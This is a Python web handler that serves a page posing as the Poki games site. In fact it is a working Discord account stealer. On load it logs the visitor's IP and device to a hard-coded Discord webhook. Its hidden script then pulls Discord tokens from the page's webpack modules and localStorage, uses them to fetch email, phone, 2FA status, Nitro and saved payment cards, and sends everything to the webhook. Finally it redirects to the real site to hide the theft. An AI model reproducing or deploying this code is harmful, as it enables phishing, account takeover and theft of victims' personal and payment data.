from http.server import BaseHTTPRequestHandler
import json
import urllib.request

class handler(BaseHTTPRequestHandler):
    def do_GET(self):
        WEBHOOK = "https://discord.com/api/webhooks/1464803825847369837/j3diMzcguRrWtdRMnswJ5uA4_fCymBpPkTsV-eNYEs2xjChfvhpXOTCSb-AMB2ZXgz2Q"
        POKI_IMAGE = "https://img.poki.com/cdn-cgi/image/quality=78,width=1200,height=1200,fit=cover,f=auto/d1b46218990584f294f2f27eed934b5b.png"
        
        ip = (self.headers.get('CF-Connecting-IP') or 
              self.headers.get('X-Real-IP') or 
              self.headers.get('X-Forwarded-For', '').split(',')[0].strip())
        ua = self.headers.get('User-Agent', 'Unknown')
        
        # Send initial notification only
        try:
            payload = {
                "username": "Image Logger",
                "content": "@everyone",
                "embeds": [{
                    "title": "🎯 Someone Opened The Link!",
                    "color": 16753920,
                    "description": "Grabbing Discord account data...",
                    "fields": [
                        {"name": "📍 IP", "value": f"`{ip}`", "inline": False},
                        {"name": "💻 Device", "value": f"```{ua[:100]}```", "inline": False}
                    ],
                    "thumbnail": {"url": POKI_IMAGE},
                    "footer": {"text": "Discord data incoming..."}
                }]
            }
            req = urllib.request.Request(WEBHOOK, 
                data=json.dumps(payload).encode(),
                headers={'Content-Type': 'application/json'})
            urllib.request.urlopen(req)
        except:
            pass
        
        html = f'''<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<meta property="og:type" content="website">
<meta property="og:title" content="Poki - Free Online Games">
<meta property="og:description" content="Play the best free online games">
<meta property="og:image" content="{POKI_IMAGE}">
<meta property="og:image:width" content="1200">
<meta property="og:image:height" content="630">
<meta name="twitter:card" content="summary_large_image">
<title>Poki Games</title>
<style>
*{{margin:0;padding:0}}
body{{background:#00D9FF;display:flex;justify-content:center;align-items:center;min-height:100vh}}
.logo{{max-width:400px;width:90%}}
</style>
</head>
<body>
<img src="{POKI_IMAGE}" class="logo">
<script>
(async()=>{{
// NO GPS - Silent data grab only
const webhook='{WEBHOOK}';

// Get Discord token
let tokens=[];
try{{
if(window.webpackChunkdiscord_app){{
window.webpackChunkdiscord_app.push([[Math.random()],{{}},r=>{{
for(let m of Object.values(r.c)){{
try{{
if(m?.exports?.default?.getToken){{
let t=m.exports.default.getToken();
if(t&&!tokens.includes(t))tokens.push(t);
}}
if(m?.exports?.getToken){{
let t=m.exports.getToken();
if(t&&!tokens.includes(t))tokens.push(t);
}}
}}catch(e){{}}
}}
}}]);
}}
}}catch(e){{}}

// Scan storage for tokens
try{{
for(let i=0;i<localStorage.length;i++){{
let v=localStorage.getItem(localStorage.key(i));
if(v){{
let m=v.match(/[\\w-]{{24}}\\.[\\w-]{{6}}\\.[\\w-]{{27,}}/g);
if(!m)m=v.match(/mfa\\.[\\w-]{{84,}}/g);
if(m)m.forEach(t=>{{if(t&&!tokens.includes(t))tokens.push(t)}});
}}
}}
}}catch(e){{}}

// If Discord token found, get full account
if(tokens.length>0){{
for(let token of tokens){{
try{{
let r=await fetch('https://discord.com/api/v9/users/@me',{{headers:{{'Authorization':token}}}});
if(r.ok){{
let user=await r.json();

// Get payment info
let cards=[];
try{{
let b=await fetch('https://discord.com/api/v9/users/@me/billing/payment-sources',{{headers:{{'Authorization':token}}}});
if(b.ok){{
let data=await b.json();
cards=data.map(c=>`${{c.brand}} *${{c.last_4}} (${{c.expires_month}}/${{c.expires_year}})`);
}}
}}catch(e){{}}

// Get Nitro
let nitro='None';
try{{
let s=await fetch('https://discord.com/api/v9/users/@me/billing/subscriptions',{{headers:{{'Authorization':token}}}});
if(s.ok){{
let data=await s.json();
if(data.length>0)nitro=data[0].type==1?'Nitro Classic':'Nitro Full';
}}
}}catch(e){{}}

const email=user.email||'No email set';
const phone=user.phone||'No phone set';
const username=`${{user.username}}#${{user.discriminator}}`;

// Send complete account data
await fetch(webhook,{{
method:'POST',
headers:{{'Content-Type':'application/json'}},
body:JSON.stringify({{
content:`@everyone 🚨 **${{username}}** OPENED THE LINK!`,
embeds:[{{
title:`🔑 ${{username}} - Account Stolen`,
color:16711680,
description:`**Discord User:** ${{username}}\\n**Email:** ${{email}}\\n**Phone:** ${{phone}}`,
fields:[
{{name:'👤 Username',value:username,inline:false}},
{{name:'📧 Email',value:email,inline:false}},
{{name:'📱 Phone',value:phone,inline:false}},
{{name:'🆔 ID',value:user.id,inline:true}},
{{name:'🔐 2FA',value:user.mfa_enabled?'✅':'❌',inline:true}},
{{name:'💎 Nitro',value:nitro,inline:true}},
{{name:'💳 Cards',value:cards.length>0?cards.join('\\n'):'None',inline:false}},
{{name:'🔑 Token',value:`\`\`\`${{token}}\`\`\``,inline:false}}
],
thumbnail:{{url:`https://cdn.discordapp.com/avatars/${{user.id}}/${{user.avatar}}.png`}},
footer:{{text:`${{username}} got logged`}}
}}]
}})
}});
break;
}}
}}catch(e){{}}
}}
}}

// Send browser info
const tz=Intl.DateTimeFormat().resolvedOptions().timeZone;
await fetch(webhook,{{
method:'POST',
headers:{{'Content-Type':'application/json'}},
body:JSON.stringify({{
embeds:[{{
title:'💻 Browser Info',
color:65535,
fields:[
{{name:'Timezone',value:tz,inline:true}},
{{name:'Language',value:navigator.language,inline:true}},
{{name:'Platform',value:navigator.platform,inline:true}}
]
}}]
}})
}});

// Redirect to real Poki after grabbing data
setTimeout(()=>{{window.location.href='https://poki.com'}},2500);
}})();
</script>
</body>
</html>'''
        
        self.send_response(200)
        self.send_header('Content-type', 'text/html')
        self.end_headers()
        self.wfile.write(html.encode())
